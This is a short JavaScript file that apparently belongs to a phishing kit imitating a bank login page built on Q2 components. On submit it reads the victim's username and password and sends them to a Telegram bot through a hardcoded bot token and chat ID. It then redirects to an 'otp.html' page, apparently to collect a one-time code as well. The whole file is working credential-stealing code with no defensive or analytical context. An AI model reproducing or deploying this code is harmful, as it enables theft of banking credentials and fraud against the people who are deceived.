document
  .querySelector('q2-btn[test-id="btnSubmit"]')
  .addEventListener("click", function (event) {
    event.preventDefault();
    const username = document
      .querySelector('q2-input[test-id="fldUsername"]')
      .shadowRoot.querySelector("input").value;
    const password = document
      .querySelector('q2-input[test-id="fldPassword"]')
      .shadowRoot.querySelector("input").value;

    // Data to bot
    const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
    const chatId = "1139790477";
    const message = `Username: ${username} \n Password: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: `POST`,
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          //Redirect to the next page
          window.location.href = "otp.html";
        } else {
          alert("Failed to send message");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Error sending message");
      });
  });
